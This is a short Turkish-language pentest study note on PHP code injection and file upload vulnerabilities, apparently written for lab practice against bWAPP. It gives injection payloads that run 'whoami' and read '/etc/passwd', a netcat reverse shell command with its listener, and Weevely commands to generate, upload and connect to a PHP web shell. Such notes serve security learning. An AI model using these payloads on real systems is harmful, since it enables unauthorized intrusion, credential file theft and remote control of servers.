# Php Enjeksiyon

## PHP Kod Enjeksiyonu

- PHP Code Injection, kullanıcı girdisinin güvensiz biçimde PHP kodu olarak değerlendirilmesi sonucu saldırganın sunucu üzerinde PHP kodu çalıştırabilmesine yol açan zafiyettir.

- işlenirse sunucuda ls komutu çalıştırılır ve sonuç HTTP yanıtına aktarılıyorsa sunucudaki ilgili dizinin dosya ve klasörleri tarayıcıda görüntülenebilir.

- Hedef üzerinden:

- > system('ls');
- > ...; system("whoami") // ; PHP’de mevcut ifadeyi sonlandırır ve ardından yeni bir PHP ifadesinin başlamasına olanak tanır.
- > ...; system("cat /etc/passwd")

- Kullanıcı girdisi → PHP tarafından kod olarak çalıştırılır → ls sunucuda çalışır → çıktı tarayıcıya döner

### Netcat kullanılabilir:

- > ...; system("nc 10.0.2.4 1234 -e /bin/bash") // PHP kod enjeksiyonu/RCE bulunan test sisteminde local ip ve port girilir

- > nc -nvlp 1234 //Dinleyici tarafında çalıştırılır hedef hacklenir

## Upload Açıkları

- File Upload Vulnerability, bir web uygulamasının kullanıcı tarafından yüklenen dosyaları yeterince doğrulamaması ve kısıtlamaması sonucu oluşan güvenlik açığıdır.
- Örneğin bir site yalnızca .jpg yüklenmesine izin vermesi gerekirken, dosya türünü düzgün kontrol etmiyorsa beklenmeyen veya çalıştırılabilir dosyaların sunucuya yüklenmesine izin verebilir.

### Weevely

- Weevely = Yetkili pentestlerde PHP web shell üzerinden uzak komut çalıştırma ve sistemi yönetme amacıyla kullanılan araçtır.

- > weevely generate 123456 myweevely.php // 123456 parolasıyla kullanılacak myweevely.php adlı Weevely PHP agent dosyasını oluşturur. Dosya yerel makinede oluşturulur. Hedefe upload ile dosya yüklenir
- > weevely http://10.0.2.9/bWAPP/images/myweevely.php 123456 // Sunucuya yüklenmiş Weevely PHP agent’ına bağlanarak, web sunucusunun sahip olduğu yetkiler kapsamında uzaktan yönetim/komut oturumu açar.
- Agent oluştur → izinli lab sunucusuna yükle → URL + parola ile Weevely'e bağlan → Weevely oturumu
